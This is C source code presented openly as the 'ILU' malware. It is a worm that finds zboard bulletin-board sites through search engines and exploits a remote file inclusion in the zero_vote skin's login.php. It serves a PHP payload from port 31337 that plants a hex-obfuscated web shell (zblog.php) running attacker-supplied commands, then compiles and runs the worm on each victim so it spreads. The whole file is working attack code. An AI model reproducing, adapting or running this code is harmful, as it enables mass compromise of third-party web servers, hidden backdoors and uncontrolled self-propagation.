// Source code of the ILU malware, in C++
          
         */Coded by : Venom37222/*

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <net/if.h>
#ifdef __sun__
#include <sys/sockio.h>
#endif

#define DEBUG_ING
#undef DEBUG_ING

#define TMP_FILE "./tmp.core"
#define CMD_FILE "./cmd.core"
#define PRC_FILE "./proc.core"
#define SCS (0)
#define MIN (1)

#ifdef __linux__
#define DEF_ETH "eth0"
#else
#ifdef __FreeBSD__
#define DEF_ETH "ed0"
#else
#ifdef __sun__
#define DEF_ETH "hme0"
#endif
#endif
#endif

#define MAX_BUF (0x0000ffff)
#define FIR_BUF (0x00000800)
#define SEC_BUF (0x00000400)
#define THR_BUF (0x00000200)
#define MIN_BUF (0x00000100)

#define VENDOR "nzeo.com"

// search rule
#define FD_RULE_0 "/zboard/zboard.php"
#define FD_RULE_1 "/zb41/zboard.php"
#define FD_RULE_2 "/bbs/zboard.php"
#define FD_RULE_3 "/zb/zboard.php"
#define FD_RULE_4 "/zb40/zboard.php"
#define FD_RULE_5 "/board/zboard.php"
#define FD_RULE_6 "zboard.php"
#define FD_RULE_7 "zboard.ph"

// pattern
#define FD_PATH_0 "/zboard/skin/zero_vote/login.php"
#define FD_PATH_1 "/zb41/skin/zero_vote/login.php"
#define FD_PATH_2 "/bbs/skin/zero_vote/login.php"
#define FD_PATH_3 "/zb/skin/zero_vote/login.php"
#define FD_PATH_4 "/zb40/skin/zero_vote/login.php"
#define FD_PATH_5 "/board/skin/zero_vote/login.php"
#define FD_PATH_6 "/skin/zero_vote/login.php"

#define RESULT_OK "200 OK"
#define MAKE_STR1 "BACKDOOR MAKE SUCCESS"
#define MAKE_STR2 "ZBCODE MAKE SUCCESS"
#define DELT_STR1 "BACKDOOR DELETE SUCCESS"
#define DELT_STR2 "ZBCODE DELETE SUCCESS"

#define DEF_PORT (31337)
#define CONN_PORT (80)
#define DEF_TIME (20)

int set_sock(char *sc_gt_host,int port,int type);
void re_connt_lm(int st_sock_va,int type);
int proc_r();
void t_kill();
void sf_exit();
int g_ip(char *ip);
int make_cmd_file();
int filter_f(char *test_bf,int tnum);

int sock;

struct tg_rl
{
 int r_num;
 char *r_str;
 char *url_str;
};

#define TARGET_NUM (7)
#define SEARCH_NUM (4)

struct tg_rl __tg_rule_va[]=
{
 {0,FD_RULE_0,FD_PATH_0},
 {1,FD_RULE_1,FD_PATH_1},
 {2,FD_RULE_2,FD_PATH_2},
 {3,FD_RULE_3,FD_PATH_3},
 {4,FD_RULE_4,FD_PATH_4},
 {5,FD_RULE_5,FD_PATH_5},
 {6,FD_RULE_6,FD_PATH_6},
 {7,FD_RULE_7,FD_PATH_6},
 {8,NULL,NULL}
};

struct search_rule
{
 int num;
 u_char *url;
 int maxnum;
 int defnum;
 u_char *http_head;
};

struct search_rule search_va[]=
{
 {0,"www.google.com",990,10,"http://"},
 {1,"kr.search.yahoo.com",990,15,"http://"},
 {2,"search.nate.com",480,10,"http://"},
 {3,"search.lycos.com",990,10,"//"},
 {4,"kr.altavista.com",1000,10,"//"},
 {5,NULL,0,0,NULL}
};

void t_kill()
{
#ifdef DEBUG_ING
 fprintf(stdout,"time out\n");
#endif
 close(sock);
 sock=-1;
 signal(SIGALRM,SIG_DFL);
 return;
}

void sf_exit()
{
#ifdef DEBUG_ING
 fprintf(stdout,"safe exit\n");
#endif
 close(sock);
 kill((int)proc_r(),9);
 unlink(TMP_FILE);
 unlink(CMD_FILE);
 unlink(PRC_FILE);
 exit(-1);
}

int main(int argc,char *argv[])
{
 FILE *fp;

 int tnum=(SCS);
 int chk=(SCS);
 int gogo=(SCS);
 int whgl=(SCS);
 int qnum=(SCS);
 int tgrl_sl=(MIN);
 int _conn_num=(SCS);
 int port=(CONN_PORT);
 int def_port=(DEF_PORT);
 int sc_gt_sock;
 int host_chk=(SCS);

 u_char *gg_ptr=NULL;
 u_char *t_ptr=NULL;
 u_char __zr_bf[(MAX_BUF)];
 u_char *port_ptr=NULL;

 char pkt[(FIR_BUF)];
 char host[(SEC_BUF)];
 char url[(SEC_BUF)];
 char test_bf[(MAX_BUF)];
 char req_t_bf[(THR_BUF)];
 char ip[(MIN_BUF)];
 char atk_code[(MIN_BUF)];

 signal(SIGINT,sf_exit);
 signal(SIGTSTP,sf_exit);

 while((whgl=getopt(argc,argv,"S:s:T:t:Q:q:P:p:H:h:U:u:"))!=EOF)
 {
  extern char *optarg;
  switch(whgl)
  {
   case 'S':
   case 's':
    tnum=atoi(optarg);
    if(SEARCH_NUM<tnum)
    {
     fprintf(stderr,"target error\n");
     exit(-1);
    }
    break;

   case 'T':
   case 't':
    tgrl_sl=atoi(optarg);
    if(TARGET_NUM<tgrl_sl)
    {
     fprintf(stderr,"target error\n");
     exit(-1);
    }
    break;

   case 'Q':
   case 'q':
    qnum=atoi(optarg);
    break;
    
   case 'P':
   case 'p':
    def_port=atoi(optarg);
    break;
    
   case 'H':
   case 'h':
    memset((char *)host,0,sizeof(host));
    strncpy(host,optarg,sizeof(host)-1);
    host_chk++;
    break;
    
   case 'U':
   case 'u':
    memset((char *)url,0,sizeof(url));
    strncpy(url,optarg,sizeof(url)-1);
    host_chk++;
    break;
    
   default:
    exit(-1);
  }
 }

 (int)make_cmd_file();

 if(fork()==0)
 {
  signal(SIGALRM,SIG_IGN);
  for(whgl=0;whgl<argc;whgl++)
  {
   memset((char *)argv[whgl],0,strlen(argv[whgl]));
  }
  strcpy(argv[0],"receive mode process");
  if((fp=fopen(PRC_FILE,"w"))==NULL)
  {
   sf_exit();
  }
  fprintf(fp,"%d\n",getpid());
  fclose(fp);
  sc_gt_sock=(int)set_sock(NULL,def_port,1);
  (void)re_connt_lm(sc_gt_sock,0);
 }
 else
 {
  for(whgl=0;whgl<argc;whgl++)
  {
   memset((char *)argv[whgl],0,strlen(argv[whgl]));
  }
  strcpy(argv[0],"scanning mode process");

  switch(host_chk)
  {
   case 1:
#ifdef DEBUG_ING
    fprintf(stdout,"argument error\n");
#endif
    sf_exit();
    break;
    
   case 2:
    goto ok;
    break;
  }

#ifdef DEBUG_ING
  fprintf(stdout,"search url: %s\n",search_va[tnum].url);
#endif
  for(_conn_num=qnum; _conn_num< search_va[tnum].maxnum; _conn_num += (search_va[tnum].defnum))
  {
conn: if((sock=(int)set_sock(search_va[tnum].url,(CONN_PORT),0))==-1)
   {
    goto conn;
   }

   memset((char *)req_t_bf,0,sizeof(req_t_bf));
   switch(search_va[tnum].num)
   {
    case 0:
     snprintf(req_t_bf,sizeof(req_t_bf)-1,
      "GET /search?q=%s"
      "&hl=ko&lr=&ie=UTF-8&start=%d&sa=N "
      "HTTP/1.0\r\n\r\n",(__tg_rule_va[tgrl_sl].r_str),_conn_num);
     break;
    case 1:
     snprintf(req_t_bf,sizeof(req_t_bf)-1,
      "GET /search/web?p=%s&b=%d "
      "HTTP/1.0\r\n\r\n",(__tg_rule_va[tgrl_sl].r_str),_conn_num);
     break;
    case 2:
     snprintf(req_t_bf,sizeof(req_t_bf)-1,
      "GET /webpage/search.asp?query=%s&start=%d "
      "HTTP/1.0\r\n\r\n",(__tg_rule_va[tgrl_sl].r_str),_conn_num);
     break;
    case 3:
     snprintf(req_t_bf,sizeof(req_t_bf)-1,
      "GET /default.asp?query=%s&first=%d&pmore=more "
      "HTTP/1.0\r\n"
      "Accept-Language: ko\r\n"
      "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\n"
      "Host: %s\r\n\r\n",(__tg_rule_va[tgrl_sl].r_str),_conn_num,search_va[tnum].url);
     break;
    case 4:
     snprintf(req_t_bf,sizeof(req_t_bf)-1,
      "GET /web/results?itag=wrx&q=%s&stq=%d "
      "HTTP/1.0\r\n"
      "Accept-Language: ko\r\n"
      "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\n"
      "Host: %s\r\n\r\n",(__tg_rule_va[tgrl_sl].r_str),_conn_num,search_va[tnum].url);
     break;
   }
   send(sock,req_t_bf,strlen(req_t_bf),0);
   whgl=(SCS);

   if((fp=fopen(TMP_FILE,"w"))==NULL)
   {
    return(-1);
   }
   signal(SIGALRM,SIG_IGN);
   alarm(MAX_BUF);
   
   memset((char *)test_bf,0,sizeof(test_bf));
   while(recv(sock,test_bf,sizeof(test_bf)-1,0))
   {
    fprintf(fp,"%s",test_bf);
    memset((char *)test_bf,0,sizeof(test_bf));
   }
   fclose(fp);
   close(sock);

   if((fp=fopen(TMP_FILE,"r"))==NULL)
   {
    return(-1);
   }

   while(fgets(__zr_bf,sizeof(__zr_bf)-1,fp))
   {
    gg_ptr=__zr_bf;

    while(MIN)
    {
     t_ptr=(char *)strstr(gg_ptr,search_va[tnum].http_head);
     gg_ptr=(char *)strstr(gg_ptr,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);

     if(t_ptr!=NULL)
     {
      memset((char *)test_bf,0,sizeof(test_bf));
      whgl=(SCS);
      chk=(SCS);

      for(gogo=0;gogo<strlen(t_ptr);gogo++)
      {
       if(chk)
       {
        if(t_ptr[gogo]=='>')
         chk=0;
       }
       else {
        if(t_ptr[gogo]==' ')
         continue;
        else if(t_ptr[gogo]=='<')
         chk=1;
        else test_bf[whgl++]=t_ptr[gogo];
       }
      }

      if(!strstr(test_bf,__tg_rule_va[tgrl_sl].r_str))
       continue;
      else t_ptr=(char *)strstr(test_bf,__tg_rule_va[tgrl_sl].r_str);

      if(t_ptr!=NULL)
       t_ptr[0]='\0';
      else continue;

      if(filter_f(test_bf,tnum))
      {
       t_ptr=(char *)strstr(test_bf,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);
       if(strstr(t_ptr,search_va[tnum].http_head))
        continue;

       memset((char *)host,0,sizeof(host));
       memset((char *)url,0,sizeof(url));

       chk=(SCS);

       if(strstr(test_bf,search_va[tnum].http_head))
       {
        t_ptr=(char *)strstr(test_bf,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);
        port=(CONN_PORT);

        for(whgl=0;whgl<strlen(t_ptr)+1;whgl++)
        {
         if(t_ptr[whgl]=='/')
         {
          for(gogo=0;whgl<strlen(t_ptr);whgl++)
           url[gogo++]=t_ptr[whgl];
          strcat(url,__tg_rule_va[tgrl_sl].url_str);
          break;
         }
         else if(t_ptr[whgl]=='\0')
         {
          strncpy(url,__tg_rule_va[tgrl_sl].url_str,sizeof(url)-1);
          break;
         }
         else if(t_ptr[whgl]==':')
         {
          port_ptr=(char *)strstr(t_ptr,":")+1;
          port=atoi(port_ptr);
         }
         else host[chk++]=t_ptr[whgl];
        }
#ifdef DEBUG_ING
        fprintf(stdout,"Total:%s,URL:%s,HOST:%s,PORT:%d\n",test_bf,url,host,port);
#endif
ok:
        sock=set_sock(host,port,0);
        if(sock==-1)
         continue;
        else {
         memset((char *)ip,0,sizeof(ip));
         memset((char *)atk_code,0,sizeof(atk_code));
         memset((char *)pkt,0,sizeof(pkt));

         (int)g_ip(ip);
         snprintf(atk_code,sizeof(atk_code)-1,"dir=http://%s:%d/\r\n",ip,def_port);
         snprintf(pkt,sizeof(pkt)-1,
          "POST http://%s%s HTTP/1.0\r\n"
          "Content-Type: application/x-www-form-urlencoded\r\n"
          "Content-Length: %d\r\n"
          "Host: %s\r\n\r\n%s\r\n",host,url,strlen(atk_code),host,atk_code);
         send(sock,pkt,strlen(pkt),0);
         memset((char *)pkt,0,sizeof(pkt));
         recv(sock,pkt,sizeof(pkt)-1,0);
#ifdef DEBUG_ING
         if(strstr(pkt,RESULT_OK))
         {
          if(strstr(pkt,MAKE_STR1))
           fprintf(stdout,"%s\n",MAKE_STR1);
          if(strstr(pkt,MAKE_STR2))
           fprintf(stdout,"%s\n",MAKE_STR2);
          if(strstr(pkt,DELT_STR1))
           fprintf(stdout,"%s\n",DELT_STR1);
          if(strstr(pkt,DELT_STR2))
           fprintf(stdout,"%s\n",DELT_STR2);
          printf("%s: %s\n",RESULT_OK,host);
         }
#endif
        }
        close(sock);

        if(host_chk)
        {
         sf_exit();
        }
       }
      }
     }
     else break;
    }
    memset((char *)__zr_bf,0,sizeof(__zr_bf));
   }
   fclose(fp);
   unlink(TMP_FILE);
  }
  sf_exit();
 }
}

int set_sock(char *sc_gt_host,int port,int type)
{
 struct sockaddr_in sock_st;
 struct sockaddr_in t_st;
 int nw_gt_sock,s_s;
 struct hostent *hst_etr;
 int sc_gt_sock;
 int t_c=0;
 char t_b[(SEC_BUF)];
 FILE *fp;
 char http_rq[]="HTTP/1.1 200 OK\r\n\r\n";

 if(!type){
  signal(SIGALRM,t_kill);
  alarm(DEF_TIME);

  if((hst_etr=gethostbyname(sc_gt_host))==NULL)
  {
   return(-1);
  }
  if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  {
   return(-1);
  }
  sock_st.sin_family=(AF_INET);
  sock_st.sin_port=htons(port);
  sock_st.sin_addr=*((struct in_addr *)hst_etr->h_addr);
  memset(&(sock_st.sin_zero),0,8);

  if(connect(sock,(struct sockaddr *)&sock_st,sizeof(struct sockaddr))==-1)
  {
   close(sock);
   return(-1);
  }
  return(sock);
 }
 else{
  if((sc_gt_sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  {
   return(-1);
  }

  sock_st.sin_family=(AF_INET);
  sock_st.sin_port=htons(port);
  sock_st.sin_addr.s_addr=(INADDR_ANY);
  memset(&(sock_st.sin_zero),0,8);

  if(bind(sc_gt_sock,(struct sockaddr *)&sock_st,sizeof(struct sockaddr))==-1)
  {
   close(sc_gt_sock);
   return(-1);
  }
#define BK_LG 10
  if(listen(sc_gt_sock,(BK_LG))==-1){
   close(sc_gt_sock);
   return(-1);
  }
  while(1){
   s_s=sizeof(struct sockaddr_in);
   if((nw_gt_sock=accept(sc_gt_sock,(struct sockaddr *)&t_st,&s_s))==-1)
   {
    close(nw_gt_sock);
    close(sc_gt_sock);
    return(-1);
   }
   while(recv(nw_gt_sock,&t_c,1,0)){
    if(t_c==0x0d){
     recv(nw_gt_sock,&t_c,1,0);
     if(t_c==0x0a){
      recv(nw_gt_sock,&t_c,1,0);
      if(t_c==0x0d){
       recv(nw_gt_sock,&t_c,1,0);
       if(t_c==0x0a){
        break;
       }
      }
     }
    }
   }

   send(nw_gt_sock,http_rq,strlen(http_rq),0);
   if((fp=fopen(CMD_FILE,"r"))==NULL){
    close(nw_gt_sock);
    close(sc_gt_sock);
    return(-1);
   }
   memset((char *)t_b,0,sizeof(t_b));
   while(fgets(t_b,sizeof(t_b)-1,fp)){
    send(nw_gt_sock,t_b,strlen(t_b),0);
   }
   fclose(fp);
   close(nw_gt_sock);
   continue;
  }
  close(sc_gt_sock);
  return(-1);
 }
}

void re_connt_lm(int st_sock_va,int type)
{
 if(st_sock_va==-1)
 {
  if(!type){
   kill(getppid(),9); // parent
  }
  kill((int)proc_r(),9); // child
  sf_exit();
 }
}

int proc_r(){
 FILE *fp;
 int proc_n;
 if((fp=fopen(PRC_FILE,"r"))==NULL){
  exit(-1); // child check.
 }
 fscanf(fp,"%16d",&proc_n);
 fclose(fp);
 return proc_n;
}

int g_ip(char *ip)
{
 int sock;
 struct ifreq ifpq;
 struct sockaddr_in *pq;

 memset(&ifpq,0,sizeof(ifpq));
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
 {
  return(-1);
 }
 pq=(struct sockaddr_in *)&ifpq.ifr_addr;
 pq->sin_family=AF_INET;
 
 memcpy(ifpq.ifr_name,(DEF_ETH),sizeof(ifpq.ifr_name));
 if(ioctl(sock,SIOCGIFADDR,&ifpq)==0)
 {
  memset((char *)ip,0,(MIN_BUF));
  snprintf(ip,(MIN_BUF)-1,"%s",inet_ntoa(pq->sin_addr));
 }
 return 0;
}

#define BACKDOOR_PATH "zblog.php"
#define CODE_PATH "zbcode"
#define CODE_PATH_SRC "zbcode.c"

int make_cmd_file()
{
 unsigned long w1=0;
 FILE *fp;
 FILE *pf;
 
 if((fp=fopen(CMD_FILE,"w"))==NULL)
 {
  return(-1);
 }
 
 fprintf(fp,"<?\n"
  "chdir('../../');\n\n"
  "if(($fp=fopen('%s','r'))!=NULL)\n"
  "{\n"
  "$pnum=fread($fp,32);\n"
  "fclose($fp);\n"
  "$pnum=str_replace(\"\\n\",\"\",$pnum);\n"
  "if(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\n"
  "{\n"
  "exit;\n"
  "}\n"
  "}\n\n"
  "$cont=\"\\x3c\\x3f\\x0a\\x09\\x65\\x63\\x68\\x6f\\x20\\x27\\x3c\\x46\".\n"
  "\"\\x4f\\x52\\x4d\\x20\\x41\\x43\\x54\\x49\\x4f\\x4e\\x3d\\x24\".\n"
  "\"\\x50\\x48\\x50\\x5f\\x53\\x45\\x4c\\x46\\x20\\x4d\\x45\\x54\".\n"
  "\"\\x48\\x4f\\x44\\x3d\\x50\\x4f\\x53\\x54\\x3e\\x27\\x3b\\x0a\".\n"
  "\"\\x09\\x65\\x63\\x68\\x6f\\x20\\x27\\x3c\\x49\\x4e\\x50\\x55\".\n"
  "\"\\x54\\x20\\x54\\x59\\x50\\x45\\x3d\\x48\\x49\\x44\\x44\\x45\".\n"
  "\"\\x4e\\x20\\x4e\\x41\\x4d\\x45\\x3d\\x63\\x6d\\x64\\x20\\x56\".\n"
  "\"\\x41\\x4c\\x55\\x45\\x3d\\x24\\x63\\x6f\\x6d\\x6d\\x61\\x6e\".\n"
  "\"\\x64\\x3e\\x3c\\x2f\\x46\\x4f\\x52\\x4d\\x3e\\x3c\\x50\\x52\".\n"
  "\"\\x45\\x3e\\x27\\x3b\\x0a\\x09\\x24\\x63\\x6f\\x6d\\x6d\\x61\".\n"
  "\"\\x6e\\x64\\x3d\\x73\\x74\\x72\\x5f\\x72\\x65\\x70\\x6c\\x61\".\n"
  "\"\\x63\\x65\\x28\\x27\\x5c\\x5c\\x27\\x2c\\x27\\x27\\x2c\\x24\".\n"
  "\"\\x63\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x29\\x3b\\x0a\\x09\\x65\".\n"
  "\"\\x63\\x68\\x6f\\x20\\x60\\x24\\x63\\x6f\\x6d\\x6d\\x61\\x6e\".\n"
  "\"\\x64\\x60\\x3b\\x0a\\x3f\\x3e\\x0a\";\n\n"
  "$fp=fopen('%s','w');\n"
  "fputs($fp,$cont);\n"
  "fclose($fp);\n\n",PRC_FILE,BACKDOOR_PATH);

 if((pf=fopen(CODE_PATH,"r"))==NULL)
 {
  return(-1);
 }
 
 fprintf(fp,"$cont=\"");
 while(fread(&w1,1,1,pf))
 {
  fprintf(fp,"\\x%02x",w1);
 }
 fclose(pf);
 fprintf(fp,"\";\n\n");
 
 fprintf(fp,"$fp=fopen('%s','w');\n"
  "fputs($fp,$cont);\n"
  "fclose($fp);\n\n",CODE_PATH);
 if((pf=fopen(CODE_PATH_SRC,"r"))==NULL)
 {
  return(-1);
 }
 fprintf(fp,"$cont=\"");
 while(fread(&w1,1,1,pf))
 {
  fprintf(fp,"\\x%02x",w1);
 }
 fclose(pf);
 fprintf(fp,"\";\n\n");
 
 fprintf(fp,"$fp=fopen('%s','w');\n"
  "fputs($fp,$cont);\n"
  "fclose($fp);\n\n",CODE_PATH_SRC);
 fprintf(fp,"$RES=`gcc -o %s %s`;\n\n",CODE_PATH,CODE_PATH_SRC);

 fprintf(fp,"chmod('%s',0755);\n",CODE_PATH);

 fprintf(fp,"if(($fp=fopen('%s','r'))!=NULL){\n",BACKDOOR_PATH);
 fprintf(fp,"echo \"%s\\n\";\n",MAKE_STR1);
 fprintf(fp,"} fclose($fp);\n\n");
 fprintf(fp,"if(($fp=fopen('%s','r'))!=NULL){\n",CODE_PATH);
 fprintf(fp,"echo \"%s\\n\";\n",MAKE_STR2);
 fprintf(fp,"} fclose($fp);\n\n");

#if 1
 fprintf(fp,"$fnum=(rand()%%%d);\n",TARGET_NUM);
 fprintf(fp,"$snum=(rand()%%%d);\n",SEARCH_NUM);
 fprintf(fp,"$randnum=(rand()%400);\n");
 
 fprintf(fp,"while(1)\n{\n");
 fprintf(fp,"if(($fp=fopen('%s','r'))!=NULL)\n"
  "{\n"
  "$pnum=fread($fp,32);\n"
  "fclose($fp);\n"
  "$pnum=str_replace(\"\\n\",\"\",$pnum);\n"
  "if(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\n"
  "{\n"
  "exit;\n"
  "}\n"
  "}\n\n",PRC_FILE);

 fprintf(fp,"$port=(rand()%%65500);\n");
 fprintf(fp,"if($port>1024){\n");
 fprintf(fp,"exec(\"./%s -t $fnum -p $port -s $snum -q $randnum\");\n",CODE_PATH);
 fprintf(fp,"}\n}\n");
#else
 fprintf(fp,"unlink('%s');\n",BACKDOOR_PATH);
 fprintf(fp,"unlink('%s');\n",CODE_PATH);

 fprintf(fp,"if(($fp=fopen('%s','r'))==NULL){\n",BACKDOOR_PATH);
 fprintf(fp,"echo \"%s\\n\";\n",DELT_STR1);
 fprintf(fp,"} else { fclose($fp);\n");
 fprintf(fp,"$result=`rm -f %s`;\n$result=`del %s`;\n",BACKDOOR_PATH,BACKDOOR_PATH);
 fprintf(fp,"if(($fp=fopen('%s','r'))==NULL){\n",BACKDOOR_PATH);
 fprintf(fp,"echo \"%s\\n\";\n",DELT_STR1);
 fprintf(fp,"}\n}\n");

 fprintf(fp,"if(($fp=fopen('%s','r'))==NULL){\n",CODE_PATH);
 fprintf(fp,"echo \"%s\\n\";\n",DELT_STR2);
 fprintf(fp,"} else { fclose($fp);\n");
 fprintf(fp,"$result=`rm -f %s`;\n$result=`del %s`;\n",CODE_PATH,CODE_PATH);
 fprintf(fp,"if(($fp=fopen('%s','r'))==NULL){\n",CODE_PATH);
 fprintf(fp,"echo \"%s\\n\";\n",DELT_STR2);
 fprintf(fp,"}\n}\n");
#endif
 fprintf(fp,"?>\n");
 fclose(fp);
}

int filter_f(char *test_bf,int tnum)
{
 switch(search_va[tnum].num)
 {
  case 0: /* google */
   if(!strstr(test_bf,"google")&&!strstr(test_bf,"/search?q=cache:")
    &&!strstr(test_bf,"<")&&!strstr(test_bf,">")
    &&!strstr(test_bf,"%3F")&&!strstr(test_bf,"...")
    &&!strstr(test_bf,VENDOR))
   {
    return 1;
   }
   else return 0;
   break;
   
  case 1: /* yahoo */
   if(!strstr(test_bf,"yahoo")&&!strstr(test_bf,"/cache.php?")
    &&!strstr(test_bf,"<")&&!strstr(test_bf,">")
    &&!strstr(test_bf,"search")&&!strstr(test_bf,".html%")
    &&!strstr(test_bf,"...")&&!strstr(test_bf,VENDOR))
   {
    return 1;
   }
   else return 0;
   break;
   
  case 2: /* nate */
   if(!strstr(test_bf,"nate")&&!strstr(test_bf,"RESULT")
    &&!strstr(test_bf,"<")&&!strstr(test_bf,">")
    &&!strstr(test_bf,"/search/")&&!strstr(test_bf,"%3F")
    &&!strstr(test_bf,"...")&&!strstr(test_bf,VENDOR))
   {
    return 1;
   }
   else return 0;
   break;
   
  case 3: /* lycos */
   if(!strstr(test_bf,"lycos")&&!strstr(test_bf,"<")
    &&!strstr(test_bf,">")&&!strstr(test_bf,"%3F")
    &&!strstr(test_bf,"...")&&!strstr(test_bf,VENDOR))
   {
    return 1;
   }
   else return 0;
   break;
   
  case 4: 
   if(!strstr(test_bf,"ref_")&&!strstr(test_bf,"<")
    &&!strstr(test_bf,">")&&!strstr(test_bf,"%3f")
    &&!strstr(test_bf,"...")&&!strstr(test_bf,VENDOR))
   {
    return 1;
   }
   else return 0;
   break;
   
  default:
   return 0;
   break;
 }
 return 0;
}
